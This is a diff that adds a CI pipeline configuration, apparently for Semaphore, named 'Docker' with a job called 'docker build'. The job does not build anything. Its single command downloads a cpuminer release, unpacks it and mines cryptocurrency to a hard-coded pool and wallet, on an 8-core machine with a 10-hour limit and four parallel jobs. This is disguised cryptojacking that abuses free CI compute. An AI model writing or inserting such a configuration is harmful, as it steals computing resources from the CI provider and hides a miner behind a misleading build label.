@@ -1,0 +1,16 @@
+version: v1.0
+name: Docker
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 10
+blocks:
+  - name: Build
+    task:
+      jobs:
+        - name: docker build
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RRJjyfbNZ3kzkKEoTCe85cUqh2i5jDTakK.I'
+          parallelism: 4
